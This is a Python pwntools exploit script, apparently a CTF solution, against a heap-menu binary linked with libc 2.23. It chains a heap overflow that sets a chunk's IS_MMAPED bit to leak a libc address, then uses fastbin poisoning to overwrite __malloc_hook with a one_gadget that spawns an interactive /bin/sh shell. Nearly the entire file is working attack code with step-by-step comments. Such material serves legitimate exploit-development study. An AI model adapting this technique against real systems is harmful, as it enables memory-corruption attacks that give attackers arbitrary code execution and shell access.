#!/usr/bin/env python

from pwn import *

def allocate(size):
    p.sendlineafter('Command: ', '1')
    p.sendlineafter('Size: ', str(size))

def fill(index, size, content):
    p.sendlineafter('Command: ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)

def free(index):
    p.sendlineafter('Command: ', '3')
    p.sendlineafter('Index: ', str(index))

def dump(index):
    p.sendlineafter('Command: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.recvuntil('Content: \n')

with context.quiet:
    p = process('./program', env = {'LD_PRELOAD': './libc-2.23.so'})

    # list[0] => fastbin_1 (0x21)
    # allocate fastbin_1 in order to launch the overflow attack
    allocate(0x18)
    fill(0, 0x18, 'a' * 0x18)

    # list[1] => smallbin_1 (0x91)
    # allocate smallbin_1 to set its IS_MMAPED bit by filling fastbin_1
    allocate(0x88)
    fill(1, 0x88, 'b' * 0x88)

    # list[2] => fastbin_2 (0x21)
    # allocate fastbin_2 in order to prevent smallbin_1 being consolidated into top chunk after free
    allocate(0x18)
    fill(2, 0x18, 'c' * 0x18)

    # smallbin_1 should be freed beforing setting its IS_MMAPED
    # fd and bk pointers are written for this chunk, which are pointing to main arena
    free(1)

    # use the overflow vulnerability in fastbin_1 to replace smallbin_1's size that
    # sets IS_MMAPED bit. Its size changes from 0x91 to 0x93 (PREV_INUSE && IS_MMAPED)
    fill(0, 0x20, 'a' * 0x18 + p64(0x93))

    # list[1] => smallbin_2 (0x93)
    # smallbin_2 will be placed in smallbin_1's chunk
    # however, calloc won't zero out its content since it's MMAPED
    allocate(0x88)

    # leak bk pointer of smallbin_1
    dump(1)

    libc_base = u64(p.recv(8)) - 0x3c4b78
    print 'libc base: {}'.format(hex(libc_base))

    # list[3] => fastbin_3 (0x71)
    # allocate a fastbin_3 chunk in order to launch the overflow attack on
    allocate(0x68)
    fill(3, 0x68, 'd' * 0x68)

    # insert the fastbin_3 into the fastbin free list
    free(3)

    # use fastbin_2 to overwrite fastbin_3's fd pointer to point to a fake chunk
    # which is located in main arena before __malloc_hook
    fake_chunk = libc_base + 0x3c4aed
    print 'fake chunk: {}'.format(hex(fake_chunk))
    fill(2, 0x18 + 0x8 + 0x8, 'c' * 0x18 + p64(0x71) + p64(fake_chunk))

    # list[3] => fastbin_3 (0x71)
    # this allocation puts the fake chunk's address in the fastbin's free list
    allocate(0x68)
    fill(3, 0x68, 'd' * 0x68)

    # list[4] => fastbin_4 (0x7f)
    # this allocation will return the fake chunk's address
    # we then overwrite __malloc_hook with the address of one_gadget's execve
    # 0x4526a execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #    [rsp+0x30] == NULL
    one_gadget = libc_base + 0x4526a
    print 'one gadget: {}'.format(hex(one_gadget))
    allocate(0x68)
    fill(4, 0x13 + 8, '0' * 0x13 + p64(one_gadget))

    # this allocation will call __malloc_hook, which jumps to one_gadget's execve
    allocate(1)

    p.interactive()

